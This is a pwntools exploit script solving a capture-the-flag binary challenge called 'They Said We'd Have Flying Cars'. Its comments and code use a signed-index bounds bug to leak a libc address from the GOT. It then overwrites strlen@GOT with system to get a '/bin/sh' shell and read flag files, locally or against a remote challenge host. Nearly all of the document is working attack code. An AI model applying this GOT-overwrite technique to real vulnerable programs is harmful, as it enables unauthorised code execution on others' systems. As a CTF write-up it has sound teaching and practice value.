#!/usr/bin/env python3
# They Said We'd Have Flying Cars - SunCTF 2026
#
# Bug: op1 STOW / op2 CHECK bounds-check the i32 index with a SIGNED compare
# (JLE/JG 0xf) and then sign-extend it (MOVSXD/CDQE) into  [0x4040a0 + idx*8].
# Negative indices therefore reach below the bay array -> arbitrary read+write.
# The GOT sits at 0x404018..0x404038, i.e. indices -17..-13, and the binary is
# non-PIE with Partial RELRO, so the GOT is writable.
#
# 1. CHECK  idx=-17   leaks write@GOT             -> libc base
# 2. STOW   idx=-16   overwrites strlen@GOT       -> system
# 3. HAIL   "/bin/sh" writes to 0x404080 then calls strlen(0x404080)
#                                                 -> system("/bin/sh")
import sys
from pwn import *

context.binary = elf = ELF("./fly", checksec=False)
context.log_level = "info"
libc = ELF("./libc.so.6", checksec=False)

BAY  = 0x4040a0
HAIL = 0x404080
idx_of = lambda addr: (addr - BAY) // 8

STOW, CHECK, HAILOP, EOFOP = b"\x01", b"\x02", b"\x03", b"\x04"


def stow(io, idx, val):
    io.send(STOW + p32(idx, sign="signed") + p64(val))
    io.recvuntil(b"[stowed]\n")


def check(io, idx):
    io.send(CHECK + p32(idx, sign="signed"))
    return u64(io.recv(8))


def hail(io, data):
    assert len(data) == 8
    io.send(HAILOP + data)


def exploit(io):
    io.recvuntil(b"op4 EOF\n")

    leak = check(io, idx_of(elf.got["write"]))
    log.success(f"write@GOT     = {leak:#x}")
    libc.address = leak - libc.sym["write"]
    log.success(f"libc base     = {libc.address:#x}")
    assert libc.address & 0xfff == 0, "libc base not page-aligned - bad leak"

    stow(io, idx_of(elf.got["strlen"]), libc.sym["system"])
    log.success(f"strlen@GOT   := system ({libc.sym['system']:#x})")

    hail(io, b"/bin/sh\x00")
    io.recvuntil(b"[hailing] ")

    io.sendline(b"id; cat flag* /flag* 2>/dev/null; echo SHELL_OK")
    io.interactive()


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        io = remote("flying-cars.chal.sunwaycybersecurityclub.org", 9402)
    else:
        io = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./fly"])
    exploit(io)
